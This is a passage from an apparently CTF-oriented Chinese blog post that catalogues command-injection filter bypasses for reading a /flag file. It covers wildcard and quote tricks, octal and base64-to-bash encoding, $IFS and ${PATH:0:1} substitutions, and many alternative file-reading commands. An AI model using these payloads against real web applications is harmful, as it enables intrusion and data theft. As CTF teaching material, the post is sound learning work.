<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="keywords" content="Hexo Theme Redefine"><meta name="author" content="tiran"><script>!function(){const e="dark";function t(t){const o=t===e,c=document.documentElement;c.setAttribute("data-theme",t),c.classList.add(t),c.classList.remove(o?"light":e),c.style.colorScheme=t}const o=function(){try{const t=localStorage.getItem("REDEFINE-THEME-STATUS");if(t){const{isDark:o}=JSON.parse(t);return o?e:"light"}}catch(e){}return matchMedia("(prefers-color-scheme: dark)").matches?e:"light"}();t(o),matchMedia("(prefers-color-scheme: dark)").addEventListener("change",({matches:o})=>{localStorage.getItem("REDEFINE-THEME-STATUS")||t(o?e:"light")}),"loading"!==document.readyState?document.body.classList.add(o+"-mode"):document.addEventListener("DOMContentLoaded",()=>{document.body.classList.add(o+"-mode"),document.body.classList.remove((o===e?"light":e)+"-mode")})}()</script><style>:root[data-theme=dark]{--background-color:#202124;--background-color-transparent:rgba(32, 33, 36, 0.6);--second-background-color:#2d2e32;--third-background-color:#34353a;--third-background-color-transparent:rgba(32, 33, 36, 0.6);--primary-color:#0066CC;--first-text-color:#ffffff;--second-text-color:#eeeeee;--third-text-color:#bebec6;--fourth-text-color:#999999;--default-text-color:#bebec6;--invert-text-color:#373D3F;--border-color:rgba(255, 255, 255, 0.08);--selection-color:#0066CC;--shadow-color-1:rgba(255, 255, 255, 0.08);--shadow-color-2:rgba(255, 255, 255, 0.05)}:root[data-theme=light]{--background-color:#fff;--background-color-transparent:rgba(255, 255, 255, 0.6);--second-background-color:#f8f8f8;--third-background-color:#f2f2f2;--third-background-color-transparent:rgba(241, 241, 241, 0.6);--primary-color:#0066CC;--first-text-color:#16171a;--second-text-color:#2f3037;--third-text-color:#5e5e5e;--fourth-text-color:#eeeeee;--default-text-color:#373D3F;--invert-text-color:#bebec6;--border-color:rgba(0, 0, 0, 0.08);--selection-color:#0066CC;--shadow-color-1:rgba(0, 0, 0, 0.08);--shadow-color-2:rgba(0, 0, 0, 0.05)}body{background-color:var(--background-color);color:var(--default-text-color)}:root[data-theme=dark] body{background-color:var(--background-color);color:var(--default-text-color)}</style><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://evan.beee.top" crossorigin><link rel="canonical" href="http://example.com/2025/06/25/rce大汇总/"><meta name="robots" content="index,follow"><meta name="googlebot" content="index,follow"><meta name="revisit-after" content="1 days"><meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey."><meta property="og:type" content="article"><meta property="og:title" content="RCE大汇总"><meta property="og:url" content="http://example.com/2025/06/25/RCE%E5%A4%A7%E6%B1%87%E6%80%BB/index.html"><meta property="og:site_name" content="tiran&#39;s blog"><meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey."><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://example.com/images/redefine-og.webp"><meta property="article:published_time" content="2025-06-25T08:55:30.000Z"><meta property="article:modified_time" content="2025-07-16T04:05:37.306Z"><meta property="article:author" content="tiran"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="http://example.com/images/redefine-og.webp"><link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg"><meta name="theme-color" content="#A31F34"><link rel="shortcut icon" href="/images/redefine-favicon.svg"><title>RCE大汇总 | tiran&#39;s blog</title><link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/fonts/Chillax/chillax.css"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/css/build/tailwind.css"><link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/fonts/GeistMono/geist-mono.css"><link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/fonts/Geist/geist.css"><script id="hexo-configurations">window.config={hostname:"example.com",root:"/",language:"zh-CN"},window.theme={articles:{style:{font_size:"16px",line_height:1.5,image_border_radius:"14px",image_alignment:"center",image_caption:!1,link_icon:!0,delete_mask:!1,title_alignment:"left",headings_top_spacing:{h1:"3.2rem",h2:"2.4rem",h3:"1.9rem",h4:"1.6rem",h5:"1.4rem",h6:"1.3rem"}},word_count:{enable:!0,count:!0,min2read:!0},author_label:{enable:!0,auto:!1,list:[]},code_block:{copy:!0,style:"mac",highlight_theme:{light:"github",dark:"vs2015"},font:{enable:!1,family:null,url:null}},toc:{enable:!0,max_depth:3,number:!1,expand:!0,init_open:!0},copyright:{enable:!0,default:"cc_by_nc_sa"},lazyload:!0,pangu_js:!1,recommendation:{enable:!1,title:"推荐阅读",limit:3,mobile_limit:2,placeholder:"/images/wallhaven-wqery6-light.webp",skip_dirs:[]}},colors:{primary:"#A31F34",secondary:null,default_mode:"light"},global:{fonts:{chinese:{enable:!1,family:null,url:null},english:{enable:!1,family:null,url:null},title:{enable:!1,family:null,url:null}},content_max_width:"1000px",sidebar_width:"210px",hover:{shadow:!0,scale:!1},scroll_progress:{bar:!1,percentage:!0},website_counter:{url:"https://cn.vercount.one/js",enable:!0,site_pv:!0,site_uv:!0,post_pv:!0},single_page:!0,preloader:{enable:!1,custom_message:null},side_tools:{gear_rotation:!0,auto_expand:!1},open_graph:{enable:!0,image:"/images/redefine-og.webp",description:"Hexo Theme Redefine, Redefine Your Hexo Journey."},google_analytics:{enable:!1,id:null}},home_banner:{enable:!0,style:"fixed",image:{light:"/images/wallhaven-wqery6-light.webp",dark:"/images/wallhaven-wqery6-dark.webp"},title:"tiran's blog",subtitle:{text:["能getshell却get不到她的心......"],hitokoto:{enable:!0,show_author:!1,api:"https://v1.hitokoto.cn?c=j"},typing_speed:100,backing_speed:80,starting_delay:500,backing_delay:1500,loop:!1,smart_backspace:!1},text_color:{light:"#fff",dark:"#d1d1b6"},text_style:{title_size:"2.8rem",subtitle_size:"1.5rem",line_height:1.2},custom_font:{enable:!1,family:null,url:null},social_links:{enable:!0,style:"default",links:{github:"https://github.com/tiranbge/",instagram:null,zhihu:null,twitter:null,email:"2118964875@qq.com",qq:"https://qm.qq.com/q/9ORI3XUm2",weixin:"https://u.wechat.com/MNOzZ7_wNuZVsuQ3ktL4X9k?s=2",steam:"https://steamcommunity.com/profiles/76561199509050328/"},qrs:{weixin:null}}},plugins:{feed:{enable:!1},aplayer:{enable:!1,type:"fixed",audios:[{name:null,artist:null,url:null,cover:null,lrc:null}]},mermaid:{enable:!1,version:"11.4.1"}},version:"2.8.5",navbar:{auto_hide:!1,color:{left:"#f78736",right:"#367df7",transparency:35},width:{home:"1200px",pages:"1000px"},links:{Home:{path:"/",icon:"fa-regular fa-house"},Friends:{icon:"fa-solid fa-link",path:"/links/"},Archives:{path:"/archives",icon:"fa-regular fa-archive"}},search:{enable:!1,preload:!0}},page_templates:{friends_column:2,tags_style:"blur"},home:{sidebar:{enable:!0,position:"left",first_item:"menu",announcement:null,show_on_mobile:!0,links:null},article_date_format:"YYYY-MM-DD",excerpt_length:200,categories:{enable:!0,limit:3},tags:{enable:!0,limit:3}},footerStart:"2025/5/31 00:00:00"},window.lang_ago={second:"%s 秒前",minute:"%s 分钟前",hour:"%s 小时前",day:"%s 天前",week:"%s 周前",month:"%s 个月前",year:"%s 年前"},window.data={masonry:!1}</script><link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/fontawesome/brands.min.css"><link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/fontawesome/solid.min.css"><link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/fontawesome/regular.min.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div class="progress-bar-container"><span class="pjax-progress-bar"></span></div><main class="page-container" id="swup"><div class="main-content-container flex flex-col justify-between min-h-dvh"><div class="main-content-header"><header class="navbar-container px-6 md:px-12"><div class="navbar-content transition-navbar"><div class="left"><a class="logo-title" href="/">tiran&#39;s blog</a></div><div class="right"><div class="desktop"><ul class="navbar-list"><li class="navbar-item"><a href="/"><i class="fa-regular fa-house fa-fw"></i> 首页</a></li><li class="navbar-item"><a href="/links/"><i class="fa-solid fa-link fa-fw"></i> 友情链接</a></li><li class="navbar-item"><a href="/archives"><i class="fa-regular fa-archive fa-fw"></i> 归档</a></li></ul></div><div class="mobile"><div class="icon-item navbar-bar"><div class="navbar-bar-middle"></div></div></div></div></div><div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between"><ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start"><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/"><span>首页 </span><i class="fa-regular fa-house fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/links/"><span>友情链接 </span><i class="fa-solid fa-link fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/archives"><span>归档 </span><i class="fa-regular fa-archive fa-sm fa-fw"></i></a></li></ul><div class="statistics flex justify-around my-2.5"><a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags"><div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div><div class="label text-third-text-color text-sm">标签</div></a><a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories"><div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div><div class="label text-third-text-color text-sm">分类</div></a><a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives"><div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div><div class="label text-third-text-color text-sm">文章</div></a></div></div><div class="window-mask"></div></header></div><div class="main-content-body transition-fade-up"><div class="main-content"><div class="post-page-container flex relative justify-between box-border w-full h-full"><div class="article-content-container"><div class="article-title relative w-full"><div class="w-full flex items-center pt-6 justify-start"><h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">RCE大汇总</h1></div></div><div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8"><div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]"><img src="/images/tiran.jpg"></div><div class="info flex flex-col justify-between"><div class="author flex items-center"><span class="name text-default-text-color text-lg font-semibold">tiran</span> <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span></div><div class="meta-info"><div class="article-meta-info"><span class="article-date article-meta-item"><i class="fa-regular fa-pen-fancy"></i>&nbsp; <span class="desktop">2025-06-25 16:55:30</span> <span class="mobile">2025-06-25 16:55:30</span> <span class="hover-info">创建</span> </span><span class="article-date article-meta-item"><i class="fa-regular fa-wrench"></i>&nbsp; <span class="desktop">2025-07-16 12:05:37</span> <span class="mobile">2025-07-16 12:05:37</span> <span class="hover-info">更新</span> </span><span class="article-pv article-meta-item"><i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span></span></div></div></div></div><div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8"><p>首先从最基础的linux命令<code>cat /flag</code>开始</p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250623190602169.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250623195308199.png" alt="image-20250623195307909"></p><h2 id="文件名被过滤怎么绕过"><a href="#文件名被过滤怎么绕过" class="headerlink" title="文件名被过滤怎么绕过"></a>文件名被过滤怎么绕过</h2><h3 id="通配符文件"><a href="#通配符文件" class="headerlink" title="*通配符文件"></a><code>*</code>通配符文件</h3><p>在Linux中<code>f*</code>可以代表所有f开头的文件，所以我们可以用<code>cat /f*</code>获得flag</p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250623193144626.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250623195343709.png"></p><h3 id="匹配文件名"><a href="#匹配文件名" class="headerlink" title="?匹配文件名"></a><code>?</code>匹配文件名</h3><p>比如我们知道flag的名字就是flag，但是可能flag这个字符串被过滤了，我们就可以用?匹配被ban的字符，用cat &#x2F;f???获得flag</p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250623193329955.png"></p><p>当然，前面不加这个f可以吗如&#x2F;????，也是可以的，就是容易被干扰，因为匹配任何四字符的文件</p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250623193555342.png"></p><h3 id="正则匹配"><a href="#正则匹配" class="headerlink" title="正则匹配"></a>正则匹配</h3><p>linux里可以用<code>[a-l]</code>这种形式匹配ascii码在9到q之间的字符，自然<code>cat /[a-l][a-l][a-l][a-l]</code>就等效于cat &#x2F;flag了</p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250623194623207.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250623195230897.png"></p><p>ascii码中可视字符顺序如下</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~</span><br></pre></td></tr></table></figure></div><h3 id="分割文件名"><a href="#分割文件名" class="headerlink" title="分割文件名"></a>分割文件名</h3><p>linux里，ca’’t、ca\t、ca””t和cat是等效的，&#x2F;fl‘’ag、&#x2F;fl\ag、&#x2F;fl””ag和&#x2F;flag是等效的，所以我们可以用这种方式绕过过滤</p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250623195614478.png"></p><h3 id="转进制"><a href="#转进制" class="headerlink" title="转进制"></a>转进制</h3><p>我们可以把flag转成各种进制。如八进制、十六进制，以八进制为例，变成<code>$&#39;\146\154\141\147&#39;</code>，然后用<code>cat /$&#39;\146\154\141\147&#39;</code>即可</p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250623200051149.png"></p><p>在php(Apache&#x2F;2.4.62 (Ubuntu) PHP 8.3.11)中不用$符</p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250623200542984.png"></p><h3 id="利用管道符"><a href="#利用管道符" class="headerlink" title="利用管道符"></a>利用管道符</h3><div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> &quot;Y2F0IC9mKg==&quot; | base64 -d|bash</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250623202900383.png"></p><p>如果对应环境有其他编码也可以换其他冷门点的编码</p><h3 id="被过滤"><a href="#被过滤" class="headerlink" title="&#x2F;被过滤"></a>&#x2F;被过滤</h3><p>linux里echo ${PATH}可以获得当前路径</p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250623203039088.png"></p><p>显然我们需要获取第一个字符</p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250623203139862.png"></p><p><code>$&#123;PATH:0:1&#125;</code>第二个参数表示起始位置，第三个参数表示截取长度，所以可以构造出<code>cat $&#123;PATH:0:1&#125;flag</code></p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250623203338673.png"></p><p>当然不止PATH一个，我们可以查看环境变量（但是比赛都基本上启docker，没我那么多环境变量，但是像PWD，HOME，SHELL还是有的）</p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250623203648840.png"></p><p><code>$&#123;PWD:0:1&#125;、$&#123;HOME:0:1&#125;、$&#123;SHELL:0:1&#125;</code></p><p>或者还可以使用cd的方式,若flag在&#x2F;flag&#x2F;flag.txt</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ..;cd ..;cd ..;cd root;cat flag.txt</span><br></pre></td></tr></table></figure></div><h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125; //大括号，&#123;cat,flag.php&#125;</span><br><span class="line">$IFS、$IFS$9、$&#123;IFS&#125; 三兄弟都行</span><br><span class="line">&lt; //重定向字符 cat&lt;/flag</span><br><span class="line">%09 //tab键URL编码</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250623204321319.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250623204423890.png"></p><h3 id="特殊变量"><a href="#特殊变量" class="headerlink" title="特殊变量"></a>特殊变量</h3><p>特殊变量 <code>$1</code>到<code>$9</code>， <code>$a</code>到<code>$z</code>，<code>$@</code>和<code>$*</code> ，这些变量输出值为空 例如： <code>c$9at /fl$9ag</code></p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250623211805717.png"></p><h3 id="变量拼接"><a href="#变量拼接" class="headerlink" title="变量拼接"></a>变量拼接</h3><p><code>cat /flag</code>替换为：<code>a=at;b=ag;c$a /fl$b</code></p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250623212049758.png"></p><h2 id="各种读取文件的方法"><a href="#各种读取文件的方法" class="headerlink" title="各种读取文件的方法"></a>各种读取文件的方法</h2><h3 id="cat，tac，nl"><a href="#cat，tac，nl" class="headerlink" title="cat，tac，nl"></a>cat，tac，nl</h3><p>最最常见的3钟，都不需要完整文件名</p><p>&#x3D;&#x3D;cat&#x3D;&#x3D;：用于连接文件并打印到标准输出设备上，用法为：</p><div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /f*</span><br></pre></td></tr></table></figure></div><p>&#x3D;&#x3D;tac&#x3D;&#x3D;：用于将文件以行为单位的反序输出，用法为：</p><div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tac /f*</span><br></pre></td></tr></table></figure></div><p>&#x3D;&#x3D;nl&#x3D;&#x3D;：可以为输出列加上编号，用法为：</p><div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl /f*</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250624134612166.png"></p><h3 id="more-bzmore"><a href="#more-bzmore" class="headerlink" title="more&#x2F;bzmore"></a>more&#x2F;bzmore</h3><p>类似cat命令，会以一页一页的显示，方便使用者逐页阅读，用法为：</p><div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">more</span> /f*</span><br><span class="line">bzmore /f*</span><br></pre></td></tr></table></figure></div><p>不需要完整文件名</p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250624134642920.png"></p><h3 id="less-bzless"><a href="#less-bzless" class="headerlink" title="less&#x2F;bzless"></a>less&#x2F;bzless</h3><p>作用与more类似,都用来浏览文本文件中的内容,不同之处在于,使用 more 命令浏览文件内容时,只能不断向后翻看,而使用 less 命令浏览,既可以向后翻看,也可以向前看。用法为：</p><div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less /f*</span><br><span class="line">bzless /f*</span><br></pre></td></tr></table></figure></div><p>不需要完整文件名</p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250624134940436.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250624134919295.png"></p><h3 id="head，tail"><a href="#head，tail" class="headerlink" title="head，tail"></a>head，tail</h3><p>都不需要完整文件名</p><p>&#x3D;&#x3D;head&#x3D;&#x3D;：可用于查看文件的开头部分的内容，有一个常用的参数 -n 用于显示行数，默认为 10，即显示 10 行的内容。用法为：</p><div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">head /f*</span><br></pre></td></tr></table></figure></div><p>&#x3D;&#x3D;tail&#x3D;&#x3D;：作用和head相似，但它默认显示最后 10 行。用法为：</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail /f*</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250624135017511.png"></p><h3 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h3><p>Sed 代表流编辑器Stream Editor，常用于 Linux 中基本的文本处理.用法为：</p><div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed p /f*</span><br></pre></td></tr></table></figure></div><p>不需要完整文件名</p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250624135048875.png"></p><h3 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h3><p>用于将文本文件内容加以排序。用法为：</p><div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sort</span> /f*</span><br></pre></td></tr></table></figure></div><p>不需要完整文件名</p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250624135103290.png"></p><h3 id="uniq"><a href="#uniq" class="headerlink" title="uniq"></a>uniq</h3><p>删除文件中的连续重复行 如果你在不使用任何参数的情况下使用 uniq 命令,它将删除所有连续的重复行,只显示唯一的行。用法为：</p><div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uniq /f*</span><br></pre></td></tr></table></figure></div><p>不需要完整文件名</p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250624135123951.png"></p><h3 id="rev"><a href="#rev" class="headerlink" title="rev"></a>rev</h3><p>反转一个或多个文件的行。用法为</p><div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rev /f*</span><br></pre></td></tr></table></figure></div><p>不需要完整文件名，获得的是逆序的flag</p><p>当然，我们可以使用<code>rev /f* | rev</code>获得正序的flag:</p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250624135149731.png"></p><h3 id="od"><a href="#od" class="headerlink" title="od"></a>od</h3><p>od(Octal Dump)命令用于将指定文件内容以八进制、十进制、十六进制、浮点格式或 ASCII 编码字符方式显示,系统默认的显示方式是八进制。用法为：</p><div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">od -c /f*</span><br></pre></td></tr></table></figure></div><p>不需要完整文件名</p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250624135238634.png"></p><p>你可能会奇怪中间那个0000020是啥，我们可以看到这个命令在linux里的运行结果：</p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250624135218428.png"></p><p>左边一列其实是它的地址，记得把地址0000020删了就是文件内容了，当然直接f12也可以看到linux里那样的运行结果：</p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250624135320789.png"></p><h3 id="vim-vi"><a href="#vim-vi" class="headerlink" title="vim&#x2F;vi"></a>vim&#x2F;vi</h3><p>这俩都是Linux里的文件编辑器，我们在网页直接用system(“vim &#x2F;f*”);虽然不会进入编辑模式但还是可以看到里面的内容。用法为:</p><div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /f* </span><br><span class="line">vi /f*</span><br></pre></td></tr></table></figure></div><p>不需要完整文件名</p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250624135414120.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250624135444808.png"></p><h3 id="man"><a href="#man" class="headerlink" title="man"></a>man</h3><p>man 命令是 Linux 下的帮助指令，通过 man 指令可以查看 Linux 中的指令帮助、配置文件帮助和编程帮助等信息，类似于vim&#x2F;vi，直接对文本运行可以看到文本内容。用法为：</p><div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">man /f*</span><br></pre></td></tr></table></figure></div><p>不需要完整文件名</p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250624135517308.png"></p><h3 id="paste"><a href="#paste" class="headerlink" title="paste"></a>paste</h3><p>使用paste命令可以将每个指定文件里的每一行整合到对应一行里写到标准输出,之间用制表符分隔。用法为：</p><div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paste /f*</span><br></pre></td></tr></table></figure></div><p>不需要完整文件名</p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250624135537804.png"></p><h3 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h3><p>查找文件里符合条件的字符串。用法为：</p><div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &#123; /f*</span><br></pre></td></tr></table></figure></div><p>不需要完整文件名</p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250624135555829.png"></p><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><p>查看文件信息或类型。用法为：</p><div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file -f /f*</span><br></pre></td></tr></table></figure></div><p>不需要完整文件名</p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250624135615857.png"></p><h3 id="dd"><a href="#dd" class="headerlink" title="dd"></a>dd</h3><p>用于读取、转换并输出数据。用法为：</p><div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd <span class="keyword">if</span>=/flag</span><br></pre></td></tr></table></figure></div><p>需要完整文件名</p><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250624135631505.png"></p><h3 id="date"><a href="#date" class="headerlink" title="date"></a>date</h3><p>使用指定格式显示时间，或者设置系统时间，有时用于suid提权。用法为：</p><div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">date</span> -f /f*</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://testingcf.jsdelivr.net/gh/tiranbge/picture/20250624135652718.png"></p><p>不需要完整文件名。但他本质上是一种报错读取，直接system传值是没回显的，我们要读取报错才行：</p><div 